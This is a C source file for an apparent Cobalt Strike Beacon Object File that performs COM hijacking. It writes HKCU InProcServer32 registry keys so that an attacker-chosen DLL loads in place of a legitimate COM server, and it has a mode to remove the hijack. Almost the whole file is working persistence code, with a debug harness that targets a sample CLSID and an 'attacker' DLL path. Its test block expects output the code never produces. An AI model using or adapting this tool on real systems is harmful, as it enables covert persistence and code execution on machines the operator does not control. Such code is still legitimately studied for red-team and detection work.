#include <Windows.h>
#include "base\helpers.h"

#ifdef _DEBUG
#include "base\mock.h"
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
	DFR(KERNEL32, GetLastError);
#define GetLastError KERNEL32$GetLastError 
	DFR(KERNEL32, GetFileAttributesA);
#define GetFileAttributesA KERNEL32$GetFileAttributesA

	DFR(ADVAPI32, RegOpenKeyExA);
#define RegOpenKeyExA ADVAPI32$RegOpenKeyExA
	DFR(ADVAPI32, RegCloseKey);
#define RegCloseKey ADVAPI32$RegCloseKey
	DFR(ADVAPI32, RegCreateKeyExA);
#define RegCreateKeyExA ADVAPI32$RegCreateKeyExA
	DFR(ADVAPI32, RegSetValueExA);
#define RegSetValueExA ADVAPI32$RegSetValueExA
	DFR(ADVAPI32, RegQueryValueExA);
#define RegQueryValueExA ADVAPI32$RegQueryValueExA
	DFR(ADVAPI32, RegDeleteTreeA);
#define RegDeleteTreeA ADVAPI32$RegDeleteTreeA
	DFR(ADVAPI32, RegDeleteKeyA);
#define RegDeleteKeyA ADVAPI32$RegDeleteKeyA

	DFR(MSVCRT, strcmp);
#define strcmp MSVCRT$strcmp
	DFR(MSVCRT, strlen);
#define strlen MSVCRT$strlen
	DFR(MSVCRT, isxdigit);
#define isxdigit MSVCRT$isxdigit

	DFR(USER32, wsprintfA);
#define wsprintfA USER32$wsprintfA

	BOOL IsValidClsid(LPCSTR clsId) {
		if (!clsId) {
			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID is NULL\n");
			return FALSE;
		}

		size_t len = strlen(clsId);
		int offset = 0;

		// Accept both {GUID} and GUID formats
		if (len == 38 && clsId[0] == '{' && clsId[37] == '}') {
			offset = 1;
		}
		else if (len != 36) {
			BeaconPrintf(CALLBACK_ERROR, "[!] Invalid CLSID length: %d (expected 36 or 38)\n", len);
			return FALSE;
		}

		for (int i = 0; i < 36; i++) {
			char c = clsId[i + offset];

			if (i == 8 || i == 13 || i == 18 || i == 23) {
				if (c != '-') {
					BeaconPrintf(CALLBACK_ERROR, "[!] Invalid CLSID format: missing dash at position %d\n", i);
					return FALSE;
				}
			}
			else {
				if (!isxdigit((unsigned char)c)) {
					BeaconPrintf(CALLBACK_ERROR, "[!] Invalid CLSID format: non-hex character '%c' at position %d\n", c, i);
					return FALSE;
				}
			}
		}

		return TRUE;
	}

	BOOL ClsidExists(HKEY root, LPCSTR clsId) {
		if (!clsId) {
			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID is NULL\n");
			return FALSE;
		}

		CHAR inprocKey[256];
		wsprintfA(
			inprocKey,
			"Software\\Classes\\CLSID\\%s\\InProcServer32",
			clsId
		);

		HKEY hKey;
		LONG status = RegOpenKeyExA(
			root,
			inprocKey,
			0,
			KEY_READ,
			&hKey
		);

		if (status == ERROR_SUCCESS) {
			RegCloseKey(hKey);
			return TRUE;
		}

		if (status != ERROR_FILE_NOT_FOUND) {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] RegOpenKeyExA returned unexpected error: %d\n", status);
		}

		return FALSE;
	}

	BOOL GetLegitDllPath(LPCSTR clsId, LPSTR buffer, DWORD bufferSize) {
		if (!clsId || !buffer) return FALSE;

		CHAR hklmInProc[256];
		wsprintfA(
			hklmInProc,
			"Software\\Classes\\CLSID\\%s\\InProcServer32",
			clsId
		);

		HKEY hKey;
		LONG status = RegOpenKeyExA(
			HKEY_LOCAL_MACHINE,
			hklmInProc,
			0,
			KEY_READ,
			&hKey
		);

		if (status != ERROR_SUCCESS) {
			return FALSE;
		}

		DWORD type = 0;
		DWORD size = bufferSize;
		status = RegQueryValueExA(
			hKey,
			NULL,
			NULL,
			&type,
			(LPBYTE)buffer,
			&size
		);

		RegCloseKey(hKey);

		return (status == ERROR_SUCCESS && type == REG_SZ);
	}

	BOOL Hijack(LPCSTR dllPath, LPCSTR clsId) {
		if (!dllPath || !clsId) {
			BeaconPrintf(CALLBACK_ERROR, "[!] NULL parameter passed to Hijack()\n");
			return FALSE;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "\n");
		BeaconPrintf(CALLBACK_OUTPUT, " COM Hijacking\n");
		BeaconPrintf(CALLBACK_OUTPUT, "\n");

		CHAR hklmInProc[256];
		CHAR hkcuInproc[256];

		wsprintfA(
			hklmInProc,
			"Software\\Classes\\CLSID\\%s\\InProcServer32",
			clsId
		);
		wsprintfA(
			hkcuInproc,
			"Software\\Classes\\CLSID\\%s\\InProcServer32",
			clsId
		);

		BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s\n", clsId);
		BeaconPrintf(CALLBACK_OUTPUT, "[*] HKLM Key:     %s\n", hklmInProc);
		BeaconPrintf(CALLBACK_OUTPUT, "[*] HKCU Key:     %s\n", hkcuInproc);
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Hijack DLL:   %s\n", dllPath);
		BeaconPrintf(CALLBACK_OUTPUT, "\n");

		CHAR legitDll[512] = { 0 };
		if (GetLegitDllPath(clsId, legitDll, sizeof(legitDll))) {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Legitimate DLL: %s\n", legitDll);
		}

		HKEY hKeyHKLM = NULL;
		CHAR threadingModel[64] = { 0 };
		DWORD type = 0;
		DWORD size = sizeof(threadingModel);

		LONG status = RegOpenKeyExA(
			HKEY_LOCAL_MACHINE,
			hklmInProc,
			0,
			KEY_READ,
			&hKeyHKLM
		);

		if (status != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open HKLM InProcServer32: %d\n", status);
			return FALSE;
		}

		status = RegQueryValueExA(
			hKeyHKLM,
			"ThreadingModel",
			NULL,
			&type,
			(LPBYTE)threadingModel,
			&size
		);

		RegCloseKey(hKeyHKLM);

		if (status == ERROR_FILE_NOT_FOUND) {
			wsprintfA(threadingModel, "Apartment");
			BeaconPrintf(CALLBACK_OUTPUT, "[*] ThreadingModel not set in HKLM, using default: %s\n", threadingModel);
		}
		else if (status != ERROR_SUCCESS || type != REG_SZ) {
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read ThreadingModel from HKLM: %d\n", status);
			return FALSE;
		}
		else {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] ThreadingModel: %s\n", threadingModel);
		}

		BeaconPrintf(CALLBACK_OUTPUT, "");

		HKEY hKeyHKCU = NULL;
		DWORD disposition;

		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Creating HKCU InProcServer32 key...\n");
		status = RegCreateKeyExA(
			HKEY_CURRENT_USER,
			hkcuInproc,
			0,
			NULL,
			REG_OPTION_NON_VOLATILE,
			KEY_WRITE,
			NULL,
			&hKeyHKCU,
			&disposition
		);

		if (status != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create HKCU InProcServer32: %d\n", status);
			return FALSE;
		}

		if (disposition == REG_CREATED_NEW_KEY) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Created new registry key\n");
		}
		else if (disposition == REG_OPENED_EXISTING_KEY) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened existing registry key\n");
		}

		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 2: Setting DLL path...\n");
		status = RegSetValueExA(
			hKeyHKCU,
			NULL,
			0,
			REG_SZ,
			(const BYTE*)dllPath,
			(DWORD)(strlen(dllPath) + 1)
		);

		if (status != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to set default DLL path: %d\n", status);
			RegCloseKey(hKeyHKCU);
			return FALSE;
		}
		BeaconPrintf(CALLBACK_OUTPUT, "[+] DLL path set successfully\n");

		// Set ThreadingModel
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 3: Setting ThreadingModel...\n");
		status = RegSetValueExA(
			hKeyHKCU,
			"ThreadingModel",
			0,
			REG_SZ,
			(const BYTE*)threadingModel,
			(DWORD)(strlen(threadingModel) + 1)
		);

		if (status != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to set ThreadingModel: %d\n", status);
			RegCloseKey(hKeyHKCU);
			return FALSE;
		}
		BeaconPrintf(CALLBACK_OUTPUT, "[+] ThreadingModel set successfully\n");

		RegCloseKey(hKeyHKCU);

		BeaconPrintf(CALLBACK_OUTPUT, "\n");
		BeaconPrintf(CALLBACK_OUTPUT, "[+] COM Hijacking completed!\n");
		BeaconPrintf(CALLBACK_OUTPUT, "\n");
		BeaconPrintf(CALLBACK_OUTPUT, "[!] The hijack will trigger when:\n");
		BeaconPrintf(CALLBACK_OUTPUT, "    - The associated scheduled task runs\n");
		BeaconPrintf(CALLBACK_OUTPUT, "    - An application instantiates this COM object\n");
		BeaconPrintf(CALLBACK_OUTPUT, "\n");

		return TRUE;
	}

	BOOL Delete(LPCSTR clsId) {
		if (!clsId) {
			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID is NULL\n");
			return FALSE;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "\n");
		BeaconPrintf(CALLBACK_OUTPUT, " Deleting COM Object\n");
		BeaconPrintf(CALLBACK_OUTPUT, "\n");

		CHAR hkcuClsid[256];
		CHAR hkcuInproc[256];

		wsprintfA(
			hkcuClsid,
			"Software\\Classes\\CLSID\\%s",
			clsId
		);

		wsprintfA(
			hkcuInproc,
			"%s\\InProcServer32",
			hkcuClsid
		);

		BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s\n", clsId);
		BeaconPrintf(CALLBACK_OUTPUT, "[*] HKCU Key:     %s\n", hkcuInproc);
		BeaconPrintf(CALLBACK_OUTPUT, "\n");

		HKEY hKey = NULL;
		LONG status = RegOpenKeyExA(
			HKEY_CURRENT_USER,
			hkcuInproc,
			0,
			KEY_READ,
			&hKey
		);

		if (status != ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "[!] No hijack found (InProcServer32 missing): %d\n", status);
			return FALSE;
		}

		CHAR dllPath[512] = { 0 };
		DWORD type = 0;
		DWORD size = sizeof(dllPath);

		status = RegQueryValueExA(
			hKey,
			NULL,
			NULL,
			&type,
			(LPBYTE)dllPath,
			&size
		);

		RegCloseKey(hKey);

		if (status == ERROR_SUCCESS && type == REG_SZ) {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Current hijacked DLL: %s\n", dllPath);
		}
		else {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not read current DLL value: %d\n", status);
		}

		BeaconPrintf(CALLBACK_OUTPUT, "\n");

		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Deleting InProcServer32 key...\n");
		status = RegDeleteTreeA(
			HKEY_CURRENT_USER,
			hkcuInproc
		);

		if (status == ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] InProcServer32 key deleted successfully\n");
		}
		else if (status == ERROR_FILE_NOT_FOUND) {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] InProcServer32 key not found (already deleted?)\n");
		}
		else {
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to delete InProcServer32: %d\n", status);
			return FALSE;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 2: Deleting CLSID key...\n");
		status = RegDeleteKeyA(
			HKEY_CURRENT_USER,
			hkcuClsid
		);

		if (status == ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] CLSID key deleted successfully\n");
		}
		else if (status == ERROR_FILE_NOT_FOUND) {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] CLSID key not found (already deleted?)\n");
		}
		else {
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to delete CLSID key: %d\n", status);
			return FALSE;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "\n");
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Deleted COM Object\n");
		BeaconPrintf(CALLBACK_OUTPUT, "\n");

		if (status == ERROR_SUCCESS && dllPath[0] != '\0') {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Manually delete if needed:\n");
			BeaconPrintf(CALLBACK_OUTPUT, "    del \"%s\"\n", dllPath);
		}
		BeaconPrintf(CALLBACK_OUTPUT, "\n");

		return TRUE;
	}

	BOOL HijackMode(LPCSTR dllPath, LPCSTR clsId) {
		BOOL inHKLM = ClsidExists(HKEY_LOCAL_MACHINE, clsId);
		if (!inHKLM) {
			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID not found in HKLM\n");
			BeaconPrintf(CALLBACK_ERROR, "[!] This CLSID may not be hijackable or doesn't exist\n");
			return FALSE;
		}

		BOOL inHKCU = ClsidExists(HKEY_CURRENT_USER, clsId);
		if (inHKCU) {
			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID already present in HKCU\n");
			BeaconPrintf(CALLBACK_ERROR, "[!] Run in delete mode first to remove existing hijack\n");
			return FALSE;
		}

		return Hijack(dllPath, clsId);
	}

	BOOL DeleteMode(LPCSTR clsId) {
		BOOL inHKCU = ClsidExists(HKEY_CURRENT_USER, clsId);
		if (!inHKCU) {
			BeaconPrintf(CALLBACK_ERROR, "[!] CLSID not present in HKCU\n");
			BeaconPrintf(CALLBACK_ERROR, "[!] No hijack found to remove\n");
			return FALSE;
		}

		return Delete(clsId);
	}

	void go(char* args, int len) {
		datap parser;
		LPSTR mode;
		LPSTR dllPath = NULL;
		LPSTR clsId;
		INT32 modeLen, dllLen = 0, clsIdLen;

		if (!args || len == 0) {
			BeaconPrintf(CALLBACK_ERROR, "[!] No arguments provided\n");
			BeaconPrintf(CALLBACK_ERROR, "Usage:\n");
			BeaconPrintf(CALLBACK_ERROR, "  Hijack: bof_com_hijack hijack <dll_path> <clsid>\n");
			BeaconPrintf(CALLBACK_ERROR, "  Delete: bof_com_hijack delete <clsid>\n");
			return;
		}

		BeaconDataParse(&parser, args, len);
		mode = BeaconDataExtract(&parser, &modeLen);

		if (mode == NULL || modeLen == 0) {
			BeaconPrintf(CALLBACK_ERROR, "[!] No mode provided\n");
			BeaconPrintf(CALLBACK_ERROR, "Usage: hijack or delete\n");
			return;
		}

		if (strcmp(mode, "hijack") == 0) {
			dllPath = BeaconDataExtract(&parser, &dllLen);
			clsId = BeaconDataExtract(&parser, &clsIdLen);

			if (dllPath == NULL || dllLen == 0) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Hijack mode requires a DLL path\n");
				BeaconPrintf(CALLBACK_ERROR, "Usage: bof_com_hijack hijack <dll_path> <clsid>\n");
				return;
			}

			if (clsId == NULL || clsIdLen == 0) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Hijack mode requires a CLSID\n");
				BeaconPrintf(CALLBACK_ERROR, "Usage: bof_com_hijack hijack <dll_path> <clsid>\n");
				return;
			}

			if (!IsValidClsid(clsId)) {
				return;
			}

			DWORD dllAttr = GetFileAttributesA(dllPath);
			if (dllAttr == INVALID_FILE_ATTRIBUTES) {
				BeaconPrintf(CALLBACK_ERROR, "[!] DLL not found: %s\n", dllPath);
				BeaconPrintf(CALLBACK_ERROR, "[!] Error code: %d\n", GetLastError());
				return;
			}

			if (dllAttr & FILE_ATTRIBUTE_DIRECTORY) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Path is a directory, not a DLL: %s\n", dllPath);
				return;
			}

			if (!HijackMode(dllPath, clsId)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Hijack mode failed\n");
			}
		}
		else if (strcmp(mode, "delete") == 0) {
			clsId = BeaconDataExtract(&parser, &clsIdLen);

			if (clsId == NULL || clsIdLen == 0) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Delete mode requires a CLSID\n");
				BeaconPrintf(CALLBACK_ERROR, "Usage: bof_com_hijack delete <clsid>\n");
				return;
			}

			if (!IsValidClsid(clsId)) {
				return;
			}

			if (!DeleteMode(clsId)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Delete mode failed\n");
			}
		}
		else {
			BeaconPrintf(CALLBACK_ERROR, "[!] Unknown mode: %s\n", mode);
			BeaconPrintf(CALLBACK_ERROR, "Valid modes: hijack, delete\n");
		}
	}
}

#if defined(_DEBUG) && !defined(_GTEST)
int main(int argc, char* argv[]) {
	bof::runMocked<const char*, const char*, const char*>(
		go,
		"hijack",
		"C:\\Users\\attacker\\source\\repos\\poc_dll\\x64\\Release\\poc_dll.dll",
		"{0358B920-0AC7-461F-98F4-58E32CD89148}"
	);
	return 0;
}

#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
	std::vector<bof::output::OutputEntry> got =
		bof::runMocked<>(go);
	std::vector<bof::output::OutputEntry> expected = {
		{CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
	};
	ASSERT_EQ(expected.size(), got.size());
	ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif